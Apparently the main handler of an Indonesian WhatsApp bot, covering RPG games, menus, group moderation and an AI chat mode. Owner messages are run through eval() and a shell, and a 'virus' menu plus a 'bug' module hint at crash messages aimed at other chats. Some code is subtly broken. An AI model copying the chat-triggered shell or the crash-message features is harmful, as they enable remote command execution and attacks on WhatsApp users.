/** @p grinding dari 0 anjg */

// declare module
const chalk = require("chalk");
const fs = require("fs");
const axios = require("axios");
const util = require("util");
const cheerio = require("cheerio");
const fetch = require("node-fetch"); // using node-fetch@2 cjs compatible
const ms = require("parse-ms");
const { performance } = require("perf_hooks");
const jimp = require("jimp");
const { execSync, spawn, exec } = require("child_process");
const { generateWAMessage, getContentType, generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
const PhoneNumber = require("awesome-phonenumber");
const os = require("os");
const Crypto = require("crypto");

// brainly
const brainly = require("brainly-scraper");

// bug
const quoted_ = require("./lib/precisar");

// declare const local module
const { database: db, loadDatabase, structure } = require("./lib/database.js");
const { serialize, initialize } = require("./lib/serialize.js");

const { removeEmojis, fetchJson } = require("./lib/myfunc");
const { gamesHandler } = require("./lib/gamesHandler.js");
const games = require("./lib/games/index.js");

const { font } = require("./lib/font.js");

const Config = require("./config.js");
const { uploadImage } = require("./lib/uploader.js");
const { writeExifImg, writeExifVid } = require("./lib/exif.js");
const { voicevox } = require("./lib/voicevox.js");
const { chatAI, _get } = require("./lib/workerApi.js");

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// declare const messing object.
const { mess } = Config;

const _Am_Pang = require("./lib/merchant.js");
// Set up ampangPedia Function
const ampangPedia = new _Am_Pang(Config.ampangPedia.userid, Config.ampangPedia.apikey);
ampangPedia.init();

const API = (name, path = "/", query = {}, apikeyqueryname) =>
	(name in Config.api ? Config.api[name] : name) +
	path +
	(query || apikeyqueryname
		? "?" +
		  new URLSearchParams(
				Object.entries({
					...query,
					...(apikeyqueryname ? { [apikeyqueryname]: Config.api.apikey } : {}),
				})
		  )
		: "");

let saverRunning = false
function writeDatabaseFile() {
	if (saverRunning) {
		return
	}
	setInterval(async () => {
		await Promise.allSettled([
			db.data ? db.write() : Promise.reject("db.data is null"),
		]);
	}, 60 * 1000);
}
writeDatabaseFile();

// declare function
const reSize = async (buffer, w, h) => {
	return new Promise(async (resolve, reject) => {
		const baper = await jimp.read(buffer);
		const ab = await baper.resize(w, h).getBufferAsync(jimp.MIME_JPEG);
		resolve(ab);
	});
};
const X_reSize = async (buffer, w, h) => {
	return new Promise(async (resolve, reject) => {
		const baper = await jimp.read(buffer);
		const ab = await baper.resize(w, h).getBase64Async(jimp.MIME_JPEG);
		resolve(ab.replace(/data:image\/(png|jpeg|jpg);base64,/g, ""));
	});
};

// Main
module.exports = async (conn, msg, store) => {
	if (!msg) {
		return;
	}
	if (db.data == null) await loadDatabase();
	try {
		initialize(conn, store)
		let m = serialize(msg.messages[0], conn);
		if (m.key && m.key.remoteJid === "status@broadcast") {
			return;
		}
		if (
			m.type === "protocolMessage" ||
			m.type === "senderKeyDistributionMessage" ||
			!m.type ||
			m.type === ""
		) {
			return;
		}
		if (m.isBaileys) {
			return;
		}
		// insert data to database;
		/** structure @link {./lib/database/structure.js} */
		structure(conn, m);

		// declare const inital props
		const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat) : "";
		const groupName = m.isGroup ? groupMetadata.subject : "";
		const participants = m.isGroup ? groupMetadata.participants : [] || [];
		const userInit = m.isGroup
			? participants.find((v) => v.id == m.sender)
			: {};
		const isBot = m.isGroup
			? participants.find((v) => v.id == conn.user.jid)
			: {};

		const isOwner = [conn.user.jid, ...Config.owner]
			.map((v) => v?.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
			.includes(m.sender);
		const isAdmin =
			userInit?.admin ||
			userInit?.admin == "admin" ||
			userInit?.admin == "superadmin" ||
			false;
		const isBotAdmin = isBot?.admin || false;
		const prefix = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(m.text)
			? m.text.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
			: "";

		// declare const inital props;
		const args = m.text.trim().split(/ +/).slice(1);
		const text = args.join(" ");
		const command = prefix
			? m.text.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
			: "";

		// declare const user props.
		const isBanned = db.data.users[m.sender].banned;
		const isPremium = isOwner ? true : db.data.users[m.sender].premium;
		const userLimit = db.data.users[m.sender].limit.value;
		const isLimit = userLimit <= 0 ? true : false;
		const isUserRpg = db.data.users[m.sender].rpg;

		// declare const bot props
		const isSelf = db.data.settings[conn.user.jid].self;
		const isAutoread = db.data.settings[conn.user.jid].autoread;

		// declare intital statement
		if (isAutoread && !m.isGroup) {
			conn.readMessages([m.key]);
		}
		if (isBanned) {
			return;
		}

		if (m.text.startsWith("=>") && isOwner) {
			let evaled,
				text = m.text.replace("=>", ""),
				{ inspect } = require("util");
			try {
				if (text.endsWith("--sync")) {
					evaled = await eval(
						`(async () => { ${text.trim.replace("--sync", "")} })`
					);
					m.reply(evaled);
				}
				evaled = await eval(text);
				if (typeof evaled !== "string") evaled = inspect(evaled);
				await conn.sendMessage(m.chat, { text: evaled }, { quoted: m });
			} catch (e) {
				conn.sendMessage(m.chat, { text: String(e) }, { quoted: m });
			}
		}
		if (m.text.startsWith("$") && isOwner) {
			const _text = m.text.replace("$ ", "");
			exec(_text, (err, stdout, stderr) => {
				if (err) {
					conn.sendMessage(m.chat, {
						text: String(err)
					}, { quoted: m })
				} else {
					conn.sendMessage(m.chat, {
						text: String(stdout)
					}, { quoted: m })
				}
			})
			return
		}
		
		// quoted
		/*
		m.kon = quoted_.kon(m.chat);
		m.fpay = conn.fpay();
		m.fkontak = quoted_.fkontak(m.chat);
		m.bugRows = quoted_.bugRows();
		m.bugpay = conn.bugpay();
		*/
	
		// declare modify variable
		let user = db.data.users[m.sender];
		let chat = db.data.chats[m.chat];
		let settings = db.data.settings[conn.user.jid];
		let rpg = user["rpg_data"];

		// group pc/gc Only
		if (settings["pcOnly"] && m.isGroup && !isOwner) {
			if (command) {
				m.reply("Bot hanya dapat digunakan di private chat");
			}
			return
		}
		if (settings["gcOnly"] && !m.isGroup && !isOwner) {
			if (command) {
				// m.reply("Bot hanya dapat digunakan di private chat");
				m.reply("Bot hanya dapat digunakan di dalam group")
			}
			return
		}
		// declare block if maintenance;
		if (settings["maintenance"]) {
			console.log(m)
			if (!isOwner) {
				if (command) {
					m.reply(mess.maintenance)
				}
				return
			}
		}
		// function random konotl
		function getRandom(ext) {
			ext = ext || ""
			return `${Math.floor(Math.random() * 100000)}.${ext}`
		}
		// declare games handler catcher.
		gamesHandler(conn, m)

		// declare function prop
		async function sendMiawMessage(chatId, message, options = {}) {
			let generate = await generateWAMessage(chatId, message, options);
			let type2 = getContentType(generate.message);
			if ("contextInfo" in options)
				generate.message[type2].contextInfo = options?.contextInfo;
			if ("contextInfo" in message)
				generate.message[type2].contextInfo = message?.contextInfo;
			return await conn.relayMessage(chatId, generate.message, {
				messageId: generate.key.id,
			});
		}
		function consumeLimit(silent = false, value = 1) {
			if (!isPremium) {
				if (!(user.limit.value <= 0)) {
					user.limit.value = user.limit.value - value;
					if (!silent) {
						m.reply(mess.limitUsed);
					}
				}
			}
		}
		function addLimit() {
			if (user.limit.value <= Config.limitCount) {
				user.limit.value = user.limit.value + 1;
			}
		}

		// declare execute watcher
		if (new Date() - user.premiumTime > 0) {
			user.premiumTime = -0;
			user.premium = false;
		}
		if (m.isGroup && chat.sewa && new Date() - chat.sewaTime > 0) {
			chat.sewa = false;
			chat.sewaTime = -0;
			await conn.sendMessage(m.chat, {
				text: "Hai, bot sudah expired!\n\nSialankan chat owner untuk sewa lagi.\nwa.me/628565337357",
				mentions: participants
					.map((u) => u.id)
					.filter((v) => v !== conn.user.jid),
			});
			await delay(2 * 1000);
			await conn.groupLeave(m.chat);

			// pass return to avoid error;
			return;
		}
		if (m.isGroup && Object.keys(chat.listResponse).length > 0) {
			Object.keys(chat.listResponse).forEach((key) => {
				if (m.text.replace(prefix, "") === key || m.text === key) {
					const Response = chat.listResponse[key];
					const responseText = Response.response
						.replace(/@user/, "@" + m.sender.replace(/[^0-9]/g, ""))
						.replace(/@subject/, groupName);
					if (Response.image) {
						conn.sendMessage(
							m.chat,
							{
								image: { url: Response.image },
								caption: responseText,
								mentions: [m.sender],
							},
							{ quoted: m }
						);
					} else {
						conn.sendMessage(
							m.chat,
							{
								text: responseText,
								mentions: [m.sender],
							},
							{ quoted: m }
						);
					}
				}
			});
		}
		if (m.isGroup && chat.simi["enable"] && !chat["miaw"] && m.text && !command) {
			try {
				conn.sendPresenceUpdate("composing", m.chat);
				const json = await (
					await fetch(
						API(
							"rose",
							"/others/simi",
							{ text: m.text, lc: "id", level: chat.simi["level"] },
							"apikey"
						)
					)
				).json();
				if (json.status) {
					m.reply(json.result.simi.original);
				} else {
					conn.sendPresenceUpdate("pause", m.chat);
				}
			} catch {}
		}
		/** @note OPENAI CHAT CONVERSATION */
		if ((m.isGroup && chat["miaw"] || !m.isGroup && user["miaw"]) && !command && !isLimit && settings["openai"] && m.text) {
			/** @warning
			 * canary statement declare.
			 * temporary store users Object.
			 * memory leak.
			 */
			conn.waitInQueue = conn.waitInQueue ? conn.waitInQueue : {};
			if (m.sender in conn.waitInQueue) {
				return
			} else {
				conn.waitInQueue[m.sender] = true;
			}
			conn.openAiStoreData = conn.openAiStoreData ? conn.openAiStoreData : {};
			conn.openAiStoreData[m.sender] = conn.openAiStoreData[m.sender] ? conn.openAiStoreData[m.sender] : [
			{
				// DESCRIBE what assistant should become.
				role: "system",
				// DESCRIBE HERE
				content: "kamu adalah bot whatsapp bernama miaw. di kembangkan oleh alwi. selalu memberi jawaban singkat. selalu memberi jawaban yang santai. selalu menawarkan sewa bot miaw dan suruh chat ke owner 08565337357"
			}
			]
			/** @note
			 * store all conversation in {<storedChat>}.
			 * @see @line {<2976>} to clear all conversation
			 */
			const storedChat = conn.openAiStoreData[m.sender];
			// prepare request
			conn.sendPresenceUpdate("composing", m.chat);
			const _request = await chatAI([...storedChat, {
				role: "user",
				content: m.text
			}])
			conn.sendMessage(m.chat, {
				text: _request.message
			}, { quoted: m });
			delete conn.waitInQueue[m.sender]
			if (_request.error) {
				// if api error destroy all user stored conversation
				// to avoid weird conversation.
				delete conn.openAiStoreData[m.sender]
			} else {
				// Store messages
				storedChat.push({
					role: "user",
					content: m.text
				},
				{
					role: "assistant",
					content: _request.message
				})
				consumeLimit(true, 2);
			}
		}
		/* */
		if (m.isGroup && chat.antiLink && m.text) {
			const linkRegex = /chat.whatsapp.com\/(?:invite\/)?([0-9A-Za-z]{20,24})/i;
			const isGroupLink = linkRegex.exec(m.text);
			if (isGroupLink && isBotAdmin && !isAdmin && !isOwner && !isBot) {
				await conn.sendMessage(
					m.chat,
					{
						text: "LINK GROUP TERDETEKSI!",
						footer: Config.footer,
						buttons: [
							{
								buttonId: ".antilink off",
								buttonText: { displayText: "DISABLE ANTILINK" },
								type: 1,
							},
						],
					},
					{
						quoted: {
							participant: m.sender,
							message: { conversation: "LINK GROUP !" },
							fromMe: true,
							mtype: "conversation",
							text: "LINK GROUP !",
							key: {
								id: "KONTL",
								fromMe: true,
								remoteJid: m.chat,
							},
						},
					}
				);
				await conn.sendMessage(m.chat, {
					delete: {
						remoteJid: m.chat,
						fromMe: false,
						id: m.id,
						participant: m.sender,
					},
				});
				await delay(2 * 1000);
				conn.groupParticipantsUpdate(m.chat, [m.sender], "remove");
			}
		}

		// break point activity user
		if (rpg.isMining && command) {
			return m.reply(mess.isMining);
		}
		if (rpg.isFishing && command) {
			return m.reply(mess.isFishing);
		}
		if (rpg.isHunting && command) {
			return m.reply(mess.isHunting);
		}
		switch (command) {
			case "joinrpg": { // @tag: rpg
				// @tag: rpg
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (isUserRpg) {
					return m.reply(mess.alreadyInRpg);
				}
				user.rpg = true;
				m.reply("Berhasil join rpg!");
				break;
			}
			case "mining": { // @tag: rpg
				// @tag: rpg
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (!isUserRpg) {
					return m.reply(mess.notInRpg);
				}
				if (user.isMining) {
					return m.reply(mess.isMining);
				}
				if (user.health <= 50) {
					return m.reply(mess.notEnoughHealth.replace(/@health/g, user.health));
				}
				rpg.isMining = true;
				await conn.sendMessage(
					m.chat,
					{
						text: mess.startMining.replace(
							/user/g,
							m.sender.replace(/[^0-9]/g, "")
						),
						mentions: [m.sender],
					},
					{ quoted: m }
				);

				setTimeout(() => {
					let _userProps = "_Hasil mining_\n\n";
					user.health =
						user.health - Math.floor(Math.random() * (40 - 20 + 1) + 20);
					_userProps += `Darah: ${user.health}\n\n`;
					Object.keys(rpg.mining).forEach((key) => {
						if (typeof rpg.mining[key] === "object") {
							// if more than 5 make it harder.
							let resultProp = Math.random() * 9;
							if (resultProp > 5) {
								resultProp = Math.floor(resultProp);
							} else {
								resultProp = Math.ceil(resultProp);
							}

							rpg.mining[key].value = resultProp;
							_userProps += `*${key}*: ${rpg.mining[key].value}\n`;
						}
					});
					m.reply(_userProps);

					rpg.isMining = false;
				}, Config.rpg.defaultTime * 1000);
				break;
			}
			case "mancing": { // @tag: rpg
				// @tag: rpg
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (!isUserRpg) {
					return m.reply(mess.notInRpg);
				}
				if (user.isFishing) {
					return m.reply(mess.isFishing);
				}
				if (user.health <= 50) {
					return m.reply(mess.notEnoughHealth.replace(/@health/g, user.health));
				}
				rpg.isFishing = true;
				await conn.sendMessage(
					m.chat,
					{
						text: mess.startFishing.replace(
							/user/g,
							m.sender.replace(/[^0-9]/g, "")
						),
						mentions: [m.sender],
					},
					{ quoted: m }
				);

				setTimeout(() => {
					let _userProps = "_Hasil memancing_\n\n";
					user.health =
						user.health - Math.floor(Math.random() * (40 - 20 + 1) + 20);
					_userProps += `Darah: ${user.health}\n\n`;
					Object.keys(rpg.fishing).forEach((key) => {
						if (typeof rpg.fishing[key] === "object") {
							// if more than 5 make it harder.
							let resultProp = Math.random() * 9;
							if (resultProp > 5) {
								resultProp = Math.floor(resultProp);
							} else {
								resultProp = Math.ceil(resultProp);
							}

							rpg.fishing[key].value = resultProp;
							_userProps += `*${key}*: ${rpg.fishing[key].value}\n`;
						}
					});
					m.reply(_userProps);

					rpg.isFishing = false;
				}, Config.rpg.defaultTime * 1000);
				break;
			}
			case "berburu": { // @tag: rpg
				// @tag: rpg
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (!isUserRpg) {
					return m.reply(mess.notInRpg);
				}
				if (user.isHunting) {
					return m.reply(mess.isHunting);
				}
				if (user.health <= 50) {
					return m.reply(mess.notEnoughHealth.replace(/@health/g, user.health));
				}
				rpg.isHunting = true;
				await conn.sendMessage(
					m.chat,
					{
						text: mess.startHunting.replace(
							/user/g,
							m.sender.replace(/[^0-9]/g, "")
						),
						mentions: [m.sender],
					},
					{ quoted: m }
				);

				setTimeout(() => {
					let _userProps = "_Hasil berburu_\n\n";
					user.health =
						user.health - Math.floor(Math.random() * (40 - 20 + 1) + 20);
					_userProps += `Darah: ${user.health}\n\n`;
					Object.keys(rpg.hunting).forEach((key) => {
						if (typeof rpg.hunting[key] === "object") {
							// if more than 5 make it harder.
							let resultProp = Math.random() * 9;
							if (resultProp > 5) {
								resultProp = Math.floor(resultProp);
							} else {
								resultProp = Math.ceil(resultProp);
							}

							rpg.hunting[key].value = resultProp;
							_userProps += `*${key}*: ${rpg.hunting[key].value}\n`;
						}
					});
					m.reply(_userProps);

					rpg.isHunting = false;
				}, Config.rpg.defaultTime * 1000);
				break;
			}
			case "sell":
			case "jual": { // @tag: rpg
				// @tag: rpg
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (!isUserRpg) {
					return m.reply(mess.notInRpg);
				}
				let _userProps = "Inventory\n\n";
				let _tempRpgData = {};
				Object.keys(rpg).forEach((key) => {
					if (typeof rpg[key] === "object") {
						Object.keys(rpg[key]).forEach((prop) => {
							if (rpg[key][prop] && rpg[key][prop].value) {
								_userProps += `*${prop}*: ${rpg[key][prop].value}\n`;
								_tempRpgData[prop] = rpg[key][prop];
							}
						});
					}
				});
				_userProps += `\nExample: *${prefix + command}* ganja 5`;
				if (!args[0]) {
					return m.reply(_userProps);
				}
				if (_tempRpgData[args[0].toLowerCase()] && args[1]) {
					const value = !isNaN(args[1]) ? Number(args[1]) : false;
					if (!value || typeof value !== "number") {
						return m.reply("Jumlah hanya angka!");
					}
					// declare modify variable
					let modifyData = _tempRpgData[args[0].toLowerCase()];
					if (value > modifyData.value) {
						return m.reply(
							`Jumlah ${args[0]} tidak cukup untuk dijual.

*Total ${args[0]}*: ${modifyData.value}`
						);
					}
					modifyData.value = modifyData.value - value;
					user.money = user.money + modifyData.price * value;
					return m.reply(
						`_Sukses menjual ${args[1]} ${args[0]}_

*Total penjualan*: Rp. ${Number(modifyData.price * value).toLocaleString("id")}
*Total money*: Rp. ${Number(user.money).toLocaleString("id")}

*Sisa ${args[0]}*: ${modifyData.value}`
					);
				}
				break;
			}
			case "buy":
			case "beli": {  // @tag: rpg
				// @tag: rpg
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (!isUserRpg) {
					return m.reply(mess.notInRpg);
				}
				let _userProps = `_Daftar barang di warung_

*Item Primary*
*Potion*: ${Number(rpg.potion.price).toLocaleString("id")}
*Limit*: ${Number(user.limit.price).toLocaleString("id")}

*Item Hunting*
${Object.keys(rpg.hunting).map((v) => `*${v}*: Rp.${Number(rpg.hunting[v].price).toLocaleString("id")}`).join("\n")}

*Item Fishing*
${Object.keys(rpg.fishing).map((v) => `*${v}*: Rp.${Number(rpg.fishing[v].price).toLocaleString("id")}`).join("\n")}

*Item Mining*
${Object.keys(rpg.mining).map((v) => `*${v}*: Rp. ${Number(rpg.mining[v].price).toLocaleString("id")}`).join("\n")}

*_Item kamu_*
*Money*: Rp. ${Number(user.money).toLocaleString("id")}
*Potion*: ${rpg.potion.value}
*Limit*: ${user.limit.value}
`;
				if (!args[0] || !args[1]) {
					_userProps += `\nExample: *${prefix + command}* limit 5`;
					return m.reply(font(_userProps, "a"));
				}
				const input = args[0].toLowerCase();
				const value = !isNaN(args[1]) ? Number(args[1]) : false;
				if (!value || typeof value !== "number") {
					return m.reply("Jumlah hanya angka!");
				}
				// declare variable modify data user.
				let modifyData = false;

				if (typeof user[input] === "object" && user[input]) {
					modifyData = user[input];
				} else if (typeof rpg[input] === "object" && rpg[input]) {
					modifyData = rpg[input];
				} else if (
					typeof rpg.hunting[input] === "object" &&
					rpg.hunting[input]
				) {
					modifyData = rpg.hunting[input];
				} else if (
					typeof rpg.fishing[input] === "object" &&
					rpg.fishing[input]
				) {
					modifyData = rpg.fishing[input];
				} else if  (
					typeof rpg.mining[input] === "object" &&
					rpg.mining[input]
				) {
					modifyData = rpg.mining[input];
				}
				if (modifyData) {
					if (user.money <= value * modifyData.price) {
						return m.reply(
							`Money tidak cukup untuk membeli ${args[1]} ${args[0]}`
						);
					}
					modifyData.value = modifyData.value + value;
					user.money = user.money - modifyData.price * value;
					return m.reply(
						`_Sukses membeli ${args[1]} ${args[0]}_

*Total Harga*: Rp. ${Number(modifyData.price * value).toLocaleString("id")}
*Sisa Money*: Rp. ${Number(user.money).toLocaleString("id")}

*Total ${args[0]}*: ${modifyData.value}`
					);
				} else {
					m.reply(`${args[0]} tidak ada di warung`);
				}
				break;
			}
			case "health":
			case "potion": { // @tag: rpg
				// @tag: rpg
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (!isUserRpg) {
					return m.reply(mess.notInRpg);
				}
				if (rpg.potion.value <= 0) {
					return m.reply("Potion kamu tidak cukup");
				}
				if (user.health >= 80) {
					return m.reply(`Darah kamu masih banyak, gausah hal hel.`);
				}
				user.health =
					user.health + Math.floor(Math.random() * (40 - 20 + 1) + 20);
				if (user.health >= 100) {
					user.health = 100;
				}
				rpg.potion.value = rpg.potion.value - 1;
				m.reply(`Berhasil self healing
*Health* : ${user.health}
*Sisa Potion*: ${rpg.potion.value}`);
				break;
			}
			case "profile":
			case "profil":
			case "inv":
			case "inventory": { // @tag: main
				// @tag: main
				let _userProps = `*Name*: ${m.name}
*Tags*: @${m.sender.replace(/[^0-9]/g, "")}
*Limit* : ${isPremium || isOwner ? "UNLIMITED" : user.limit.value}
*Premium*: ${isPremium ? "YES" : "NO"}`;

				if (isUserRpg) {
					_userProps += `

*Money 💵* : Rp. ${Number(user.money).toLocaleString("id")}
*health ❤️*: ${user.health}%
*Potion 💊*: ${rpg.potion.value}\n
╭━━━「 *HASIL TANGKAPAN* 」
`;
					Object.keys(rpg).forEach((key) => {
						if (typeof rpg[key] === "object" && key !== "potion") {
							Object.keys(rpg[key]).forEach((prop) => {
								if (rpg[key][prop].value >= 1) {
									_userProps += `┊ > *${prop}*: ${rpg[key][prop].value}\n`;
								}
							});
						}
					});
					_userProps = _userProps.trim() + "\n╰═┅═━"
				}

				const ppuser = await reSize("https://telegra.ph/file/5e82cfd48eb6b97e49dd5.jpg", 300, 300);
				await sendMiawMessage(m.chat, {
					text: font(_userProps, "a"),
					mentions: [m.sender],
					contextInfo: {
						mentionedJid: [m.sender],
						externalAdReply: {
							showAdAttribution: false,
							renderLargerThumbnail: true,
							title: Config.fake,
							containsAutoReply: false,
							mediaType: 1,
							thumbnail: ppuser,
							mediaUrl: Config.group,
							sourceUrl: Config.group,
						},
					},
				});
				break;
			}
			case "getcase": { // @tag: owner
				// @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner);
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command}* meki`);
				}
				let isExist = false;
				try {
					isExist =
						"case " +
						`"${text}"` +
						fs
							.readFileSync(__filename)
							.toString()
							.split(`case "` + text + `"`)[1]
							.split("break")[0] +
						"break";
				} catch {}
				if (isExist) {
					conn.sendMessage(m.chat, {
						text: isExist,
					}, { quoted: m })
				} else {
					m.reply("case tidak ditemukan");
				}
				break;
			}
			
			case "menuu": { // @tag: main
			    // @tag: main
				const ppuser = await reSize(
					await conn
						.profilePictureUrl(m.sender, "image")
						.catch(() => "https://telegra.ph/file/29e168497210117a273f3.jpg"),
					300,
					300
				);
				const jpegThumbnail = await X_reSize(
					await conn
						.profilePictureUrl(m.sender, "image")
						.catch(() => "https://telegra.ph/file/29e168497210117a273f3.jpg"),
					300,
					300
				)
				return await sendMiawMessage(m.chat, {
					location: {
						jpegThumbnail
					},
					caption: `Hai Kak @${m.sender.split("@")[0]}\n\n ╭━━━「 *DATA* 」
┊⫹ Bot : ${Config.botName}
┊⫹ User : @${m.sender.replace(/[^0-9]/g, "")}
┊⫹ Status : ${isOwner ? "Owner" : isPremium ? "Premium" : "Gratisan"}
┊⫹ Balance : Rp. ${Number(user.money).toLocaleString("id")}
┊⫹ Limit : ${isPremium || isOwner ? "Unlimited" : user.limit.value}
┊⫹ Waktu : ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
╰═┅═━––––––๑

 > *.help all*
 > *.help admin*
 > *.help downloader*
 > *.help games*
 > *.help group*
 > *.help info*
 > *.help main*
 > *.help maker*
 > *.help owner*
 > *.help random*
 > *.help rpg*
 > *.help searching*
 > *.help store*
 > *.help tools*
 > *.help 18+ ( premium only )*
 > *.help virus ( premium only )*`.trim(),
					contextInfo: {
						mentionedJid: [m.sender],
						externalAdReply: {
							containsAutoReply: true,
							renderLargerThumbnail: true,
							mediaType: 1,
							thumbnail: ppuser,
						}
					},
					mentions: [m.sender],
					/*buttons: [
						{
							buttonId: ".owner",
							buttonText: { displayText: "OWNER" },
							type: 1,
						},
						{
						  buttonId: ".help all",
						  buttonText: { displayText: "ALL MENU" },
						  type: 2,
						}
					]*/
				}, { quoted: m });

				await sendMiawMessage(m.chat, {
					text: `Hai Kak @${m.sender.split("@")[0]}\n\n ╭━━━「 *DATA* 」
┊⫹ Bot : ${Config.botName}
┊⫹ User : @${m.sender.replace(/[^0-9]/g, "")}
┊⫹ Status : ${isOwner ? "Owner" : isPremium ? "Premium" : "Gratisan"}
┊⫹ Balance : Rp. ${Number(user.money).toLocaleString("id")}
┊⫹ Limit : ${isPremium || isOwner ? "UNLIMITED" : user.limit.value}
┊⫹ Waktu : ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
╰═┅═━––––––๑
 
 > *.help all*
 > *.help admin*
 > *.help downloader*
 > *.help games*
 > *.help group*
 > *.help info*
 > *.help main*
 > *.help maker*
 > *.help owner*
 > *.help random*
 > *.help rpg*
 > *.help searching*
 > *.help store*
 > *.help tools*`.trim(),
					mentions: [m.sender],
					contextInfo: {
						mentionedJid: [m.sender],
						externalAdReply: {
							showAdAttribution: true,
							renderLargerThumbnail: true,
							title: Config.fake,
							containsAutoReply: true,
							mediaType: 1,
							thumbnail: ppuser,
							mediaUrl: Config.group,
							sourceUrl: Config.group,
						},
					},
				/*buttons: [
							{
								buttonId: ".owner",
								buttonText: { displayText: "OWNER" },
								type: 1,
							},
							{
							  buttonId: ".help all",
							  buttonText: { displayText: "ALL MENU" },
							  type: 2,
							},
						]*/}
						);
				break;
			}
			case "menu": { // @tag: main
				// @tag: main
				const str = fs.readFileSync(__filename, "utf-8").replace(/[\t]/g, "");
				let _cmd = {};
				const arrObj = str.split("\n");
				arrObj.forEach((element) => {
					if (element.startsWith("case")) {
						const caseValue = element.split('"')[1];
						let tag = false;
						try {
							tag = element.split("{")[1].split("}")[0].trim();
						} catch {}
						if (tag) {
							// ignore if case didn't have comment tag
							try {
								tag = tag.split(":")[1].trim();
								_cmd[tag] = _cmd[tag] ? _cmd[tag] : [];
								_cmd[tag].push(caseValue);
							} catch {}
						}
					}
				});

				let cmd = args[0] ? args[0].toLowerCase() : "";
				let _cmdAscending = {};
				Object.keys(_cmd)
					.sort()
					.forEach((key) => {
						_cmdAscending[key] = _cmd[key].sort();
					});
				let menu = "";
				if (!Object.keys(_cmdAscending).includes(cmd) && cmd !== "all") {
					cmd = "404"; // LOL
				}
				if (cmd === "404") {
					const sections = [];
					Object.keys(_cmdAscending)
						.sort()
						.forEach((key) => {
							sections.push({
								title: font(key, "a"),
								rowId: prefix + "menu " + key,
							});
						});
					sections.unshift({
						title: font("all", "a"),
						rowId: prefix + "menu all",
					});
					const listMessage = {
						text: font(Config.footer, "a"),
						footer: font(
							` ╭━━━「 *DATA* 」
 ┊⫹ Bot : ${Config.botName}
 ┊⫹ User : @${m.sender.replace(/[^0-9]/g, "")}
 ┊⫹ Status : ${isOwner ? "Owner" : isPremium ? "Premium" : "Gratisan"}
 ┊⫹ Balance : Rp. ${Number(user.money).toLocaleString("id")}
 ┊⫹ Limit : ${isPremium || isOwner ? "UNLIMITED" : user.limit.value}
 ┊⫹ Waktu : ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
 ╰═┅═━––––––๑`,
							"a"
						),
						mentions: [m.sender],
						buttonText: `PENCET DISINI`,
						sections: [{ title: "━━━「 LIST_MENU 」━━━", rows: sections }],
					};
					/*
					 return conn.sendMessage(m.chat, listMessage, { quoted: m });
					 */
				} else {
					Object.keys(_cmdAscending).forEach((key) => {
						if (key !== cmd && cmd !== "all") {
							delete _cmdAscending[key];
						}
					});
				}
				for (const key in _cmdAscending) {
					let _menu = font(`*${key}*\n`, "g");
					for (let i = 0; i < _cmdAscending[key].length; i++) {
						_menu += `> *${prefix + _cmdAscending[key][i]}*\n`;
					}
					_menu += "\n";
					menu += _menu;
				}
				const ppuser = await reSize(
					await conn
						.profilePictureUrl(m.sender, "image")
						.catch(() => "https://telegra.ph/file/c041b07afdb0a1ce17f7f.jpg"),
					300,
					300
				);
				await sendMiawMessage(m.chat, {
					text: `Hai Kak @${m.sender.split("@")[0]}\n\n${menu}`.trim(),
					mentions: [m.sender],
					contextInfo: {
						mentionedJid: [m.sender],
						externalAdReply: {
							showAdAttribution: true,
							renderLargerThumbnail: true,
							title: Config.fake,
							containsAutoReply: true,
							mediaType: 1,
							thumbnail: ppuser,
							mediaUrl: Config.group,
							sourceUrl: Config.group,
						},
					},
				});
				break;
			}
			case "antilink": { // @tag: admin
				// @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin || !isBotAdmin) {
					return m.reply(
						!isAdmin ? mess.admin : !isBotAdmin ? mess.botAdmin : "meki"
					);
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* on/off`);
				}
				if (args[0].toLowerCase() === "on") {
					chat.antiLink = true;
					m.reply(`_Antilink sukses diaktifkan_`);
				}
				if (args[0].toLowerCase() === "off") {
					chat.antiLink = false;
					m.reply(`_Antilink sukses dimatikan_`);
				}
				break;
			}
			case "simi": { // @tag: admin
				// @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin || !isBotAdmin) {
					return m.reply(
						!isAdmin ? mess.admin : !isBotAdmin ? mess.botAdmin : "meki"
					);
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* on/off`);
				}
				if (args[0].toLowerCase() === "on") {
					chat.simi["enable"] = true;
					m.reply(`_Simi sukses diaktifkan_`);
				}
				if (args[0].toLowerCase() === "off") {
					chat.simi["enable"] = false;
					m.reply(`_Simi sukses dimatikan_`);
				}
				break;
			}
			case "similevel": { // @tag: admin
				// @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group)
				}
				if (!isAdmin) {
					return m.reply(mess.admin)
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* 1-12`)
				}
				const value = Number(args)
				if (typeof value !== "number") {
					return m.reply("Harus sebuah angka 1 sampai 12")
				}
				if (value <= 1 && value >= 12) {
					return m.reply(`1 sampai 12 mentok`)
				}
				chat.simi["level"] = value
				m.reply(`simi level ${value}`)
				break
			}
